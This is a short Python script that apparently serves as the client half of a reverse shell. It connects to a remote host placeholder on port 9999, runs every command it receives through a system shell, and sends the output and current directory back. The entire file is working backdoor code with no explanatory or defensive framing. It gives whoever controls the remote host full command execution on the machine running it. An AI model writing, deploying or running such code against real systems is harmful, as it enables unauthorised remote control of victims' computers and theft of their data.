import socket
import os 
import subprocess
import platform
import sys

s = socket.socket()
#s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

host="HOST_ADDRESS"
port = 9999

s.connect((host,port))
name = platform.system().encode('utf-8')
#s.send(name)

while True:
    
    data = s.recv(1024)
    

    if data[:2].decode('utf-8') == "cd":
        os.chdir(data[3:].decode('utf-8'))

    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #open up a procees

        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")

        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))


